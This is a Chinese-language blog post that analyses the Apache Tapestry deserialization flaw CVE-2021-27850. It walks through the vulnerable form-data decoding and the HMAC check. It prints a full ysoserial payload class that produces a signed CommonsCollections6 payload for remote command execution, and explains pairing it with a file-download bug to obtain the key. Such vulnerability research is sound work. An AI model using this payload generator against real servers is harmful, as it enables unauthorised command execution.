

<!DOCTYPE html>
<html lang="" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="tapestry反序列化">
<meta property="og:type" content="article">
<meta property="og:title" content="tapestry反序列化 CVE-2021-27850分析">
<meta property="og:url" content="http://novysodope.github.io/2022/05/31/81/index.html">
<meta property="og:site_name" content="novy&#39;s Blog">
<meta property="og:description" content="tapestry反序列化">
<meta property="og:locale">
<meta property="og:image" content="http://novysodope.github.io/images/81/BxuHJ5YzVQDiw1f-EIFvjD842rWggi-uuWUZiiWGuvw.png">
<meta property="og:image" content="http://novysodope.github.io/images/81/S-eW3JFwPv58CucJSNnh3A5KiracIIFBt9G6N30vMFM.png">
<meta property="og:image" content="http://novysodope.github.io/images/81/UEMDVNX6yMkWkSmyfgTuxiMCN-r7fqiW8b68kkq2J8s.png">
<meta property="og:image" content="http://novysodope.github.io/images/81/LnF2S6fBSwrjjMTZNldDAbAPLAmlaov0YtEymAAbiZw.png">
<meta property="og:image" content="http://novysodope.github.io/images/81/W8mzj2n3iPvLvrMhhxH5LYpMkRCOwkf3_YhxURSGveE.png">
<meta property="og:image" content="http://novysodope.github.io/images/81/LfVPFnPs-Es2YjvtWP5TkaFCiDLXY-A3G0xT7wmx8LM.png">
<meta property="og:image" content="http://novysodope.github.io/images/81/LHIFi8VEYaSgbZAjF4JNhFzE0if1bm9UeEmeXKz11ng.png">
<meta property="og:image" content="http://novysodope.github.io/images/81/B_i6nYu8tp9DRTFx_4AQVpHrx6vFZDTqjieDE35NMVY.png">
<meta property="og:image" content="http://novysodope.github.io/images/81/dkKBj59IEg9Us_FQd2ETPuw9TYF3mEujYngjAvOKqds.png">
<meta property="og:image" content="http://novysodope.github.io/images/81/fVqPr8u_ZA-opcJ1FsX7sVAy5NkvamKmp6bE_iCksN0.png">
<meta property="og:image" content="http://novysodope.github.io/images/81/d3QUa_st_-tgcPGPpZqzNQCGRI4mxXYNRKLPG5lVRQM.png">
<meta property="og:image" content="http://novysodope.github.io/images/81/6FRk4WjL9DYCyNjH4709n4qlO-pllFXhNbQ3vgZmfvE.png">
<meta property="og:image" content="http://novysodope.github.io/images/81/Oz_W0J0-hghI-dkzAhjESbKmAnsbciEa50MLItXfEsM.png">
<meta property="og:image" content="http://novysodope.github.io/images/81/O1FFAuzAo1eWExeq8phUhAPYbYLJCZ8PGv5hKF9vwnc.png">
<meta property="og:image" content="http://novysodope.github.io/images/81/zKRKRcVGO0hQ8i_srqTGnoA5ZzhH1enYYGUW1MZnQCI.png">
<meta property="og:image" content="http://novysodope.github.io/images/81/If8QyzwA2GQCdvrB85UzqN-8jKLbx0W53k9fMiQWm8M.png">
<meta property="og:image" content="http://novysodope.github.io/images/81/TRmGDc49c712elN4FmWY0RPXhE4eATy5VLjeFk9Ngik.png">
<meta property="og:image" content="http://novysodope.github.io/images/81/5ngAXWipAgSXkgHnAHEyMXTwgUyl-3UyhnL6bjJLUPE.png">
<meta property="article:published_time" content="2022-05-31T02:14:21.000Z">
<meta property="article:modified_time" content="2024-12-11T03:44:50.399Z">
<meta property="article:author" content="novy">
<meta property="article:tag" content="java代码审计">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://novysodope.github.io/images/81/BxuHJ5YzVQDiw1f-EIFvjD842rWggi-uuWUZiiWGuvw.png">
  
  <title>tapestry反序列化 CVE-2021-27850分析 - novy&#39;s Blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  



<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"novysodope.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6,h7,h8,h9","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"a6c1581442f57290135c4581f8de49ff","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"ZyJbAKYmfgJXZGNkDKKBRC0i-gzGzoHsz","app_key":"WXTmIgfHD2JkbhooWMtgYW3C","server_url":"https://zyjbakym.lc-cn-n1-shared.com","path":"window.location.pathname"}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/rss2.xml" title="novy's Blog" type="application/rss+xml">
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>novy&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友情链接
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/rss2.xml">
                <i class="iconfont icon-rss-fill"></i>
                RSS
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="tapestry反序列化 CVE-2021-27850分析">
              
            </span>

            
              <div class="mt-3">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-author" aria-hidden="true"></i>
      novy
    </span>
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-05-31 10:14" pubdate>
        May 31, 2022 am
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      4.1k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      13 分钟
    </span>
  

  
  
    

      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="leancloud-page-views"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">tapestry反序列化 CVE-2021-27850分析</h1>
            
            <div class="markdown-body">
              <p>漏洞最早可以追溯到&lt;5.3.6版本的tapestry</p>
<p>触发点在FROM类，该类专门用于处理表单</p>
<p><code>tapestry-core/src/main/java/org/apache/tapestry5/corelib/components/Form.java</code></p>
<p>首先有两个注意的地方</p>
<p>第一个地方：</p>
<p>表单在点击按钮后会出现一个值为<code>t:submit</code>的name属性，待会会有针对这个的判断</p>
<p><img src="/images/81/BxuHJ5YzVQDiw1f-EIFvjD842rWggi-uuWUZiiWGuvw.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p><img src="/images/81/S-eW3JFwPv58CucJSNnh3A5KiracIIFBt9G6N30vMFM.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>第二个地方：</p>
<p><img src="/images/81/UEMDVNX6yMkWkSmyfgTuxiMCN-r7fqiW8b68kkq2J8s.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>将断点打在<code>onAction</code>方法查看事件处理流程</p>
<p>走到<code>if (this.isFormCancelled())</code> ，根据返回的布尔类型来进入相应的处理 </p>
<p><img src="/images/81/LnF2S6fBSwrjjMTZNldDAbAPLAmlaov0YtEymAAbiZw.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p><img src="/images/81/W8mzj2n3iPvLvrMhhxH5LYpMkRCOwkf3_YhxURSGveE.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>走到<code>this.executeStoredActions();</code>在该方法中会获取<code>t:fromdata</code>的值来进行处理</p>
<p><img src="/images/81/LfVPFnPs-Es2YjvtWP5TkaFCiDLXY-A3G0xT7wmx8LM.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>跟进<code>decodeClientData</code></p>
<p><code>tapestry-core/src/main/java/org/apache/tapestry5/internal/services/ClientDataEncoderImpl.java</code></p>
<p><img src="/images/81/LHIFi8VEYaSgbZAjF4JNhFzE0if1bm9UeEmeXKz11ng.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>最后进行反序列化，漏洞触发</p>
<p><img src="/images/81/B_i6nYu8tp9DRTFx_4AQVpHrx6vFZDTqjieDE35NMVY.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>官方在5.3.6及以后（5.4.0-5.6.1，5.7.0）的版本中并没有针对readObject进行修复，而是增加了HMAC，用途是对序列化的数据进行加密，Tapestry的所有序列化数据传输都需要使用HMAC Key进行加密，具体见</p>
<p><a target="_blank" rel="noopener" href="https://tapestry.apache.org/security.html">https://tapestry.apache.org/security.html</a></p>
<p><img src="/images/81/dkKBj59IEg9Us_FQd2ETPuw9TYF3mEujYngjAvOKqds.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>官方原本想的是通过校验签名来防止数据被篡改，然而即使使用HmacSHA1算法加密也不能保证反序列化不被利用，这时候就要说到Tapestry 的另一个漏洞：Tapestry 任意文件下载(CVE-2019-0195)，详见<a target="_blank" rel="noopener" href="https://www.modb.pro/db/113860">https://www.modb.pro/db/113860</a>，可以通过搭配文件下载下载包含有硬编码密钥的class来利用反序列化漏洞，原理类似于shiro的rememberMe反序列化</p>
<p>继续看看加了加密机制后的tapestry，这里用的是5.4.0</p>
<p>直接看到<code>decodeClientData</code>方法</p>
<p>在<code>decodeClientData</code>方法中处理<code>t:formdata</code>的值 </p>
<p><img src="/images/81/fVqPr8u_ZA-opcJ1FsX7sVAy5NkvamKmp6bE_iCksN0.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>取得<code>clientStream</code>后进行base64解码</p>
<p><img src="/images/81/d3QUa_st_-tgcPGPpZqzNQCGRI4mxXYNRKLPG5lVRQM.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>在经过<code>validateHMAC</code>方法校验签名无误后，把base64解码后的<code>clientStream</code>再进行一次gzip解码，随后将解码后的<code>clientStream</code>封装成对象输入流</p>
<p><img src="/images/81/6FRk4WjL9DYCyNjH4709n4qlO-pllFXhNbQ3vgZmfvE.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>再进行反序列化操作，漏洞产生</p>
<p><img src="/images/81/Oz_W0J0-hghI-dkzAhjESbKmAnsbciEa50MLItXfEsM.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>可以看到在<code>decodeClientData</code>方法中加了对<code>t:fromdata</code>内容的处理，且加了一个<code>ois.readBoolean()</code></p>
<p>在<code>validateHMAC</code>方法中，<code>this.hmackey</code>即包含有HmacSHA1加密算法的<code>SecretKeySpaec</code>对象</p>
<p><code>tapestry-core/src/main/java/org/apache/tapestry5/internal/services/ClientDataEncoderImpl.java</code></p>
<p><img src="/images/81/O1FFAuzAo1eWExeq8phUhAPYbYLJCZ8PGv5hKF9vwnc.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p><code>passphrase</code>来自<code>@Symbol</code></p>
<p><img src="/images/81/zKRKRcVGO0hQ8i_srqTGnoA5ZzhH1enYYGUW1MZnQCI.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p><code>HMAC_PASSPHRASE</code>即加密密钥</p>
<p><img src="/images/81/If8QyzwA2GQCdvrB85UzqN-8jKLbx0W53k9fMiQWm8M.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>总结其编码模式：</p>
<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Plain">总结其编码模式：<br><br>&lt;5.3.6版本：Gzip-&gt;base64<br><br>&#x3D;&gt;5.3.6版本：Gzip-&gt;Hmacsha1-&gt;base64<br></code></pre></div></td></tr></table></figure>
<p>根据网上的文章改造一下能用的 ，在ysoserial中引用一下5.3.6版本的Tapestry依赖，在payload目录中新建一个TapestryrcePOC 类，使用CommonsCollections6来触发漏洞</p>
<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs Plain">package ysoserial.payloads;<br><br>&#x2F;**<br> * @Author:novy<br> * @Date:10:40 2022&#x2F;4&#x2F;23<br> * @Version 1.0<br> * 参数输入格式：密钥 命令<br> **&#x2F;<br>import org.apache.tapestry5.internal.services.ClientDataEncoderImpl;<br>import org.apache.tapestry5.internal.services.URLEncoderImpl;<br>import org.apache.tapestry5.services.ClientDataEncoder;<br>import org.apache.tapestry5.services.ClientDataSink;<br>import ysoserial.payloads.annotation.Authors;<br>import ysoserial.payloads.annotation.Dependencies;<br>import ysoserial.payloads.templates.TomcatFilterMemShellFromJMX;<br>import ysoserial.payloads.util.PayloadRunner;<br><br>import java.io.ObjectOutputStream;<br><br>@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)<br>@Dependencies(&#123;&quot;org:tapestry:5.4.0 to 5.6.1 cc6,please add hmac key and command,eg:12345 calc&quot;&#125;)<br>public class TapestryrcePOC extends PayloadRunner implements ObjectPayload&lt;Object&gt; &#123;<br>    public static void main(final String[] args) throws Exception &#123;<br>        String s &#x3D; (String) new TapestryrcePOC().getObject(CommonsCollections6.class.getName(), args); &#x2F;&#x2F;这里根据情况改利用链<br>        System.out.println(&quot;payload:&quot;+s);<br>    &#125;<br>    public String getObject(String gadgetsName, boolean needBase64, String... args) throws Exception &#123;<br>        String key, command &#x3D; null;<br>        if (args.length &#x3D;&#x3D; 0) &#123;<br>            System.out.println(&quot;please add hmac key and command,eg:12345 calc&quot;);<br>        &#125;<br>        if (args.length &lt; 1) &#123;<br>            System.out.println(&quot;please add hmac key&quot;);<br>        &#125;<br>        if (args.length &lt; 2) &#123;<br>            System.out.println(&quot;please add command&quot;);<br>        &#125;else&#123;<br>            command &#x3D; args[1];<br>        &#125;<br>        &#x2F;&#x2F;密钥<br>        key &#x3D; args[0];<br>        Class clazz &#x3D; Class.forName(gadgetsName);<br>        ObjectPayload gadgets &#x3D; (ObjectPayload) clazz.newInstance();<br>        Object obj &#x3D; gadgets.getObject(command);<br>        URLEncoderImpl urlEncoder &#x3D; new URLEncoderImpl();<br>        ClientDataEncoder cde &#x3D; new ClientDataEncoderImpl(urlEncoder, key, null, null, null);<br>        ClientDataSink cds &#x3D; cde.createSink();<br>        ObjectOutputStream oos &#x3D; cds.getObjectOutputStream();<br>        oos.writeUTF(&quot;wecat_iH&quot;);<br>        oos.writeBoolean(false);<br>        oos.writeObject(obj);<br>        return cds.getClientData();<br>    &#125;<br>    @Override<br>    public Object getObject(String command) throws Exception &#123;<br>        return getObject(command, null);<br>    &#125;<br>    public Object getObject(String gadgetName, String... args) throws Exception &#123;<br>        return getObject(gadgetName, true, args);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>生成payload后，可以直接将payload复制到表单请求</p>
<p><img src="/images/81/TRmGDc49c712elN4FmWY0RPXhE4eATy5VLjeFk9Ngik.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p><img src="/images/81/5ngAXWipAgSXkgHnAHEyMXTwgUyl-3UyhnL6bjJLUPE.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.imangodoc.com/23732.html">https://www.imangodoc.com/23732.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wyswlp/article/details/6704545">https://blog.csdn.net/wyswlp/article/details/6704545</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u012749355/article/details/38440613?locationNum=5&fps=1">https://blog.csdn.net/u012749355/article/details/38440613?locationNum=5&amp;fps=1</a></p>
<p><a target="_blank" rel="noopener" href="https://tapestry.apache.org/security.html">https://tapestry.apache.org/security.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.modb.pro/db/113860">https://www.modb.pro/db/113860</a></p>
<p><a target="_blank" rel="noopener" href="https://www.4hou.com/posts/ovEk">https://www.4hou.com/posts/ovEk</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">

                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">java代码审计</a>
                    
                  </div>
                
              </div>
              <hr>
              <script src="https://utteranc.es/client.js"
        repo="novysodope/novysodope.github.io"
        issue-term="title"
        label="Comment"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
<hr>
              
                <p class="note note-warning">
                  
                    声明：<br>   本文章用于学习交流，严禁用于非法操作，出现后果一切自行承担，阅读此文章表示你已同意本声明。<br> <br> Disclaimer: <br>   This article is for study and communication. It is strictly forbidden to use it for illegal operations. All consequences shall be borne by yourself. Reading this article means that you have agreed to this statement.
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/06/01/82/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">利用tomcat自动部署机制getshell</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/05/30/105/">
                        <span class="hidden-mobile">flex反序列化原理及利用链构造</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>


            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->

  <div class="col-lg-7 mx-auto nopadding-x-md">
    <div class="container custom post-custom mx-auto">
      <img src="/img/aa.png" srcset="/img/loading.gif" lazyload class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;"><p></p> <p style="text-align:center"><span>扫一扫关注我们</span></p>
    </div>
  </div>


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     © 2018-<script type="text/javascript">document.write(new Date().getFullYear());</script> <span> <a href="#" target="_blank" rel="nofollow noopener"><font color="#2ca6cb">novy`s Blog</font>.</a> </span> Powered by <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span><font color="#2ca6cb">Hexo</font></span></a><p><script> function secondToDate(second) { if (!second) { return 0; } var time = new Array(0, 0, 0, 0, 0); if (second >= 365 * 24 * 3600) { time[0] = parseInt(second / (365 * 24 * 3600)); second %= 365 * 24 * 3600; } if (second >= 24 * 3600) { time[1] = parseInt(second / (24 * 3600)); second %= 24 * 3600; } if (second >= 3600) { time[2] = parseInt(second / 3600); second %= 3600; } if (second >= 60) { time[3] = parseInt(second / 60); second %= 60; } if (second > 0) { time[4] = second; } return time; }</script> <script type="text/javascript" language="javascript"> function setTime() { var create_time = Math.round(new Date(Date.UTC(2018, 11, 09, 6, 6, 6)).getTime() / 1000); var timestamp = Math.round((new Date().getTime() + 8 * 60 * 60 * 1000) / 1000); currentTime = secondToDate((timestamp - create_time)); currentTimeHtml = currentTime[0] + "年" + currentTime[1] + "天" + currentTime[2] + "时" + currentTime[3] + "分" + currentTime[4] + "秒"; document.getElementById("htmer_time").innerHTML = currentTimeHtml; }    setInterval(setTime, 1000);</script> 本博客已经稳定运行：<span id="htmer_time" style="color: #2ca6cb;"></span> <br/> <script async="" src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

你是第<font color="#2ca6cb"><span id="busuanzi_value_site_uv"></span></font>个小伙伴 </p> 
  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  




  <script defer src="/js/leancloud.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  
    <!-- Baidu Analytics -->
    <script defer>
      var _hmt = _hmt || [];
      (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?a6c1581442f57290135c4581f8de49ff";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
      })();
    </script>
  

  

  

  

  

  






<script  src="/js/boot.js" ></script>


</body>
</html>
